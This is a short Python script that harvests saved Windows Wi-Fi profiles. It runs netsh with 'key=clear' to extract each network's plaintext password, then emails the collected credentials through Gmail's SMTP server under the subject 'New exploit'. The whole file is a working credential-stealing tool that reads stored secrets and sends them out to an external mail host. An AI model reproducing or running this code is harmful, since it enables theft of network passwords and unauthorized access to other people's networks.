import subprocess
import smtplib
import re
import random
import string
from email.message import EmailMessage
import argparse


def create_email(recipient, email_text):
    """
    Creates an email using the EmailMessage class. Return email class
    """
    msg = EmailMessage()
    msg['Subject'] = f'New exploit - %s' % ''.join(random.choices(string.ascii_letters, k=5))
    msg['From'] = recipient
    msg['To'] = recipient
    msg.set_content(email_text)
    return msg

def send_mail(email_text, recipient, password):
    """
    Sends the email_text to the recipient. Auth using password. No exceptions raised. No return.
    """
    msg = create_email(recipient, email_text)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    try:
        server.ehlo()
        server.starttls()
        server.login(user=recipient, password=password)
        server.send_message(msg)
    except Exception as e:
        print('[-] Exception - {}'.format(e))
    finally:
        server.quit()
        print('[+] Email sent.')


def get_networks_passwords():
    """
    Gets networks details and passwords. Exceptions are appended as
    messages to the email that will be sent. Returns the email text body.
    """
    email_text = ''
    command = "netsh wlan show profile"
    output = subprocess.check_output(command)
    networks = re.findall(re.compile(r'(?si):\s([^\r\n]*)'), output.decode('utf-8'))
    for net in networks:
        if net == "":
            continue
        details_cmd = "netsh wlan show profile {} key=clear".format(net)
        try:
            details_output = subprocess.check_output(details_cmd)
            key = re.search(re.compile('(?si)Key\sContent\s+:\s([^\r\n]*)'), details_output.decode('utf-8')).group(1)
            email_text += '[+] Network: {:<20} | Key: {}\n'.format(net, key)
        except Exception as e:
            email_text += '[-] Exception when checking {}\n'.format(net)
    return email_text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', dest='email', help='Email to send and receive the details.')
    parser.add_argument('-p', dest='password', help='Password to authenticate email.')
    args = parser.parse_args()
    print('[+] Sending email...')
    send_mail(email_text=get_networks_passwords(), recipient=args.email, password=args.password)
